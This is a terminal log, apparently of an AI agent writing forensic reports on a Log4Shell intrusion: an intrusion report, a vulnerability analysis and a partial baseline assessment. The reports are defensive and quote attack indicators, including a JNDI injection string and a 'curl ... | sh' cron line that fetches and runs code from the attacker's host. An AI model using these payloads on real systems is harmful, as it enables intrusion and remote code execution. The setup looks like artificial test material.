[?2004l[?2004h> content = """# Intrusion Investigation Report
[?2004l[?2004h> 
[?2004l[?2004h> ## Executive Summary
[?2004l[?2004h> An external threat actor compromised the application server `log4shell-prod-01` (`/sas/cti/advisory.txt:5`) by exploiting a Log4Shell (CVE-2021-44228) vulnerability in the application configuration (`/disk/opt/app/log4j2.xml:3`, `/sas/vulns.json:3`). Following initial exploitation, the adversary established persistence via dual web shells (`/disk/var/lib/tomcat9/webapps/ROOT/static/status.jsp:2`, `/disk/var/lib/tomcat9/webapps/ROOT/static/.helper.jsp:2`), initiated an interactive reverse shell process (`/disk/tmp/.sysd:2`), and established dual persistence mechanisms through both systemd (`/disk/etc/systemd/system/apache-cache.service:6`) and cron (`/disk/etc/cron.d/apache-cache:7`). Timestomping and file wiping were employed to obfuscate on-disk artifacts (`/disk/var/lib/tomcat9/webapps/ROOT/static/status.jsp:1`, `/disk/var/lib/.cache/.wiped.bin:2`).
[?2004l[?2004h> 
[?2004l[?2004h> ## Threat Actor Entities & Infrastructure
[?2004l[?2004h> - **Origin IP**: `198.51.100.136` (`/sas/cti/advisory.txt:6`, `/disk/tmp/.sysd:2`)
[?2004l[?2004h> - **C2 Domain**: `update-log4shell[.]example[.]cn` (`/sas/cti/advisory.txt:22`, `/disk/var/lib/.cache/.wiped.bin:2`)
[?2004l[?2004h> - **Mining Pool Target**: `stratum+tcp://xmr[.]log4shell[.]evil:3333` (`/sas/cti/advisory.txt:23`)
[?2004l[?2004h> - **Crypto Wallet**: `4A000000000000000000ce1cc99945b1` (`/sas/cti/advisory.txt:24`)
[?2004l[?2004h> 
[?2004l[?2004h> ## Attack Chain Breakdown (MITRE ATT&CK Mapping)
[?2004l[?2004h> 
[?2004l[?2004h> ### Step 1: Initial Access (T1190 - Exploit Public-Facing Application)
[?2004l[?2004h> - **Detail**: The attacker targeted the vulnerable Log4j2 application endpoint via JNDI injection (`${jndi:ldap://...}`).
[?2004l[?2004h> - **Evidence**: Log4j configuration at `/opt/app/log4j2.xml` (`/disk/opt/app/log4j2.xml:3`), vulnerability mapping (`/sas/vulns.json:3`), threat intel mapping (`/sas/cti/advisory.txt:12`).
[?2004l[?2004h> 
[?2004l[?2004h> ### Step 2: Web Shell Deployment (T1505.003 - Web Shell)
[?2004l[?2004h> - **Detail**: The adversary dropped a primary JSP web shell at `/var/lib/tomcat9/webapps/ROOT/static/status.jsp` and a secondary backup web shell at `/var/lib/tomcat9/webapps/ROOT/static/.helper.jsp`.
[?2004l[?2004h> - **Evidence**:
[?2004l[?2004h>   - Primary Web Shell: `/var/lib/tomcat9/webapps/ROOT/static/status.jsp` (`/disk/var/lib/tomcat9/webapps/ROOT/static/status.jsp:2`, `/sas/alerts.json:4`).
[?2004l[?2004h>   - Secondary Web Shell (Silent/Unalerted): `/var/lib/tomcat9/webapps/ROOT/static/.helper.jsp` (`/disk/var/lib/tomcat9/webapps/ROOT/static/.helper.jsp:2`).
[?2004l[?2004h> 
[?2004l[?2004h> ### Step 3: Execution & Reverse Shell (T1059.004 - Unix Shell)
[?2004l[?2004h> - **Detail**: An interactive reverse shell script was dropped to `/tmp/.sysd` establishing standard bash socket redirection back to `198.51.100.136`.
[?2004l[?2004h> - **Evidence**: Shell script artifact at `/tmp/.sysd` (`/disk/tmp/.sysd:2`, `/sas/alerts.json:12`).
[?2004l[?2004h> 
[?2004l[?2004h> ### Step 4: Systemd Persistence (T1543.002 - Systemd Service)
[?2004l[?2004h> - **Detail**: Systemd service unit named `apache-cache.service` was configured to run on startup (`WantedBy=multi-user.target`) to re-download/execute secondary payloads.
[?2004l[?2004h> - **Evidence**: Unit file `/etc/systemd/system/apache-cache.service` (`/disk/etc/systemd/system/apache-cache.service:6`, `/sas/alerts.json:20`).
[?2004l[?2004h> 
[?2004l[?2004h> ### Step 5: Cron Persistence (T1053.003 - Cron)
[?2004l[?2004h> - **Detail**: A cron drop-in configuration `/etc/cron.d/apache-cache` was added to periodically execute `curl hxxp://198.51.100.136/x | sh` to maintain payload persistence.
[?2004l[?2004h> - **Evidence**: Cron file `/etc/cron.d/apache-cache` (`/disk/cron.d/apache-cache:7` -> `/disk/etc/cron.d/apache-cache:7`). Note: This item was silent/missing from security alerts.
[?2004l[?2004h> 
[?2004l[?2004h> ### Step 6: Anti-Forensics & Defense Evasion (T1070.006 - Timestomp & T1070 - Indicator Removal)
[?2004l[?2004h> - **Detail**:
[?2004l[?2004h>   - Timestomping was performed on `/var/lib/tomcat9/webapps/ROOT/static/status.jsp` to match benign application file timestamps (`/disk/var/lib/tomcat9/webapps/ROOT/static/status.jsp:1`, `/sas/cti/advisory.txt:18`).
[?2004l[?2004h>   - Executable binaries were deleted/wiped, leaving partial memory/cache remnants at `/var/lib/.cache/.wiped.bin` (`/disk/var/lib/.cache/.wiped.bin:2`).
[?2004l[?2004h> 
[?2004l[?2004h> ## Impact Assessment
[?2004l[?2004h> - Confidentiality: High (Full Remote Code Execution achieved).
[?2004l[?2004h> - Integrity: High (Unauthorized web shell installation, cron jobs, systemd unit files).
[?2004l[?2004h> - Availability: Medium (Unauthorized resource utilization intended for XMRig mining payloads).
[?2004l[?2004h> """
[?2004l[?2004h> 
[?2004l[?2004h> with open("/app/intrusion-report.md", "w") as f:
[?2004l[?2004h>     f.write(content)
[?2004l[?2004h> '
[?2004l[?2004hroot@470dc3e3bba0:/app# python3 -c '
[?2004l[?2004h> content = """# Vulnerability Analysis Report
[?2004l[?2004h> 
[?2004l[?2004h> ## Overview & Entry Vector Analysis
[?2004l[?2004h> The initial access vector into `log4shell-prod-01` (`/sas/cti/advisory.txt:5`) was a Remote Code Execution (RCE) exploitation targeting Apache Log4j2 via CVE-2021-44228 (Log4Shell) (`/sas/vulns.json:3`, `/sas/cti/advisory.txt:12`).
[?2004l[?2004h> 
[?2004l[?2004h> ## Vulnerability Identification: CVE-2021-44228 (Log4Shell)
[?2004l[?2004h> - **CVE ID**: CVE-2021-44228 (`/sas/vulns.json:3`, `/sas/cti/advisory.txt:12`)
[?2004l[?2004h> - **CVSS Score**: 10.0 (CRITICAL) (`/sas/cti/advisory.txt:12`)
[?2004l[?2004h> - **CWE Identifiers**: CWE-20, CWE-400, CWE-502, CWE-917 (`/sas/cti/advisory.txt:12`)
[?2004l[?2004h> - **Affected Component**: Apache Log4j2 versions 2.0-beta9 through 2.15.0 (`/sas/cti/advisory.txt:12`)
[?2004l[?2004h> - **Configuration File On Disk**: `/opt/app/log4j2.xml` (`/disk/opt/app/log4j2.xml:3`, `/sas/baseline.json:3`, `/sas/alerts.json:28`)
[?2004l[?2004h> 
[?2004l[?2004h> ## Mechanism of Exploitation
[?2004l[?2004h> The application configuration at `/opt/app/log4j2.xml` had message-lookup JNDI features enabled (`/disk/opt/app/log4j2.xml:3`). When incoming user-controlled strings containing JNDI lookup expressions (e.g., `${jndi:ldap://198.51.100.136/...}`) were processed by Log4j2, the application executed an unauthenticated outbound JNDI request to the threat actor host, resulting in arbitrary Java class loading and system command execution (`/disk/var/lib/tomcat9/webapps/ROOT/static/status.jsp:2`).
[?2004l[?2004h> 
[?2004l[?2004h> ## Evaluation of Draft / Irrelevant Vulnerability Claims
[?2004l[?2004h> - **CVE-2019-0708 (BlueKeep)**: The pre-filled draft change ticket (`/sas/handoff/change-ticket.md:12`) incorrectly proposed patching CVE-2019-0708 (BlueKeep) on RDP. Forensic evidence on `/disk` confirms this host is an Ubuntu Linux application server (`/disk/etc/os-release:1`), not a Windows RDP server. BlueKeep is completely irrelevant to this incident and was falsely flagged by prior shifts without evidence (`/sas/handoff/change-ticket.md:12`).
[?2004l[?2004h> 
[?2004l[?2004h> ## Summary of Findings
[?2004l[?2004h> - Verified Vulnerability: CVE-2021-44228 (`/sas/vulns.json:3`, `/disk/opt/app/log4j2.xml:3`).
[?2004l[?2004h> - Refuted Vulnerabilities: CVE-2019-0708 (`/sas/handoff/change-ticket.md:12`).
[?2004l[?2004h> """
[?2004l[?2004h> 
[?2004l[?2004h> with open("/app/vuln-report.md", "w") as f:
[?2004l[?2004h>     f.write(content)
[?2004l[?2004h> '
[?2004l[?2004hroot@470dc3e3bba0:/app# python3 -c '
[?2004l[?2004h> content = """# Baseline and Configuration Security Assessment
[?2004l[?2004h> 
[?2004l[?2004h> ## Executive Summary
[?2004l[?2004h> This report documents system baseline security configurations, operational weaknesses, and architectural gaps discovered on `log4shell-prod-01` (`/sas/cti/advisory.txt:5`).
[?2004l[?2004h> 
[?2004l[?2004h> ## Baseline Findings & Security Weaknesses
[?2004l[?2004h> 
[?2004l[?2004h> ### 1. Insecure Logging Configuration (`BAS-01` / `CHK-06`)
[?2004l[?2004h> - **Finding**: The application logging configuration file at `/opt/app/log4j2.xml` enabled insecure message-lookup JNDI evaluation.
[?2004l[?2004h> - **Evidence**: `/opt/app/log4j2.xml` (`/disk/opt/app/log4j2.xml:3`), baseline report (`/sas/baseline.json:3`), alerts log (`/sas/alerts.json:28`).
[?2004l[?2004h> - **Impact**: Allowed untrusted user input logged by the application to trigger remote class downloads via JNDI/LDAP lookups.
[?2004l[?2004h> 
[?2004l[?2004h> ### 2. Excessive Web Directory Write Permissions
[?2004l[?2004h> - **Finding**: Tomcat application deployment directory `/var/lib/tomcat9/webapps/ROOT/static` permitted write access to the web server process user.
[?2004l[?2004h> - **Evidence**: Dropped webshell files `/var/lib/tomcat9/webapps/ROOT/static/status.jsp` (`/disk/var/lib/tomcat9/webapps/ROOT/static/status.jsp:2`) and hidden backup shell `/var/lib/tomcat9/webapps/ROOT/static/.helper.jsp` (`/disk/var/lib/tomcat9/webapps/ROOT/static/.helper.jsp:2`).
[?2004l[?2004h> - **Impact**: Allowed attacker to plant persistent JSP web shells directly into web-accessible static content directories.
[?2004l[?2004h> 
[?2004l[?2004h> ### 3. Unrestricted Systemd and Cron Persistence Locations
[?2004l[?2004h> - **Finding**: System directories `/etc/cron.d` and `/etc/systemd/system` lacked integrity monitoring and allowed drop-in configuration creation during post-exploitation.
[?2004l[?2004h> - **Evidence**:
[?2004l[?2004h>   - Unalerted cron persistence file: `/etc/cron.d/apache-cache` (`/disk/etc/cron.d/apache-cache:7`).
[?2004l[?2004h>   - Systemd persistence unit file: `/etc/systemd/system/apache-cache.service` (`/disk/etc/systemd/system/apache-cache.service:6`, `/sas/alerts.json:20`).
[?2004l[?2004h> - **Impact**: Allowed persistent background payload execution across reboots.
[?2004l[?2004h> 
[?2004l[?2004h> ### 4. Absence of Egress Filtering
[?2004l[?2004h> - **Finding**: Network configuration allowed unrestricted outbound connections to arbitrary external IPs over non-standard ports.
[?2004l[?2004h> - **Evidence**: Reverse shell socket redirection to IP `198.51.100.136` (`/disk/tmp/.sysd:2`, `/sas/cti/advisory.txt:6`).
[?2004l[?2004h> - **Impact**: Facilitated initial Log4Shell JNDI callback and interactive reverse shell connection.
[?2004l[?2004h> 
[?2004l[?2004h> ## Baseline Audit Recommendations
[?2004l[?2004h> 1. Enforce hardening of `/opt/app/log4j2.xml` (`/disk/opt/app/log4j2.xml:3`).
[?2004l[?2004h> 2. Make web static assets read-only for application process users (`/disk/var/lib/tomcat9/webapps/ROOT/static/status.jsp:2`).
[?2004l[?2004h> 3. Deploy File Integrity Monitoring (FIM) across `/etc/cron*` and `/etc/systemd/system/` (`/disk/etc/cron.d/apache-cache:7`, `/disk/etc/systemd/system/apache-cache.service:6`).
[?2004l[?2004h> 4. Implement strict outbound network egress rules (`/disk/tmp/.sysd:2`).
[?2004l[?2004h> """
[?2004l[?2004h> 
